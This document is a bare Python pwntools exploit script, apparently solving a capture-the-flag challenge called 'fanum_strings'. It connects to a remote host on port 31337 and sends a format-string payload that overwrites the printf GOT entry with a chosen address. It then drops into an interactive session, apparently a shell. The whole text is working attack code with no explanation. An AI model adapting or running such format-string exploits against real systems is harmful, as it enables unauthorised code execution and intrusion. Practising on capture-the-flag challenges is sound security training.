from pwn import *

elf = context.binary = ELF('./fanum_strings')
#p = process('./fanum_strings')
p = remote('167.99.118.184', 31337)
#gdb.attach(p, 'b *0x401237\nb *main+235\nb* puts\n')#b *main+213')

printf = 0x404028
payload = b'%4198967x%10$lnA' + p64(printf)
p.sendlineafter(b'for?', b'2')
p.sendline(payload)
p.interactive()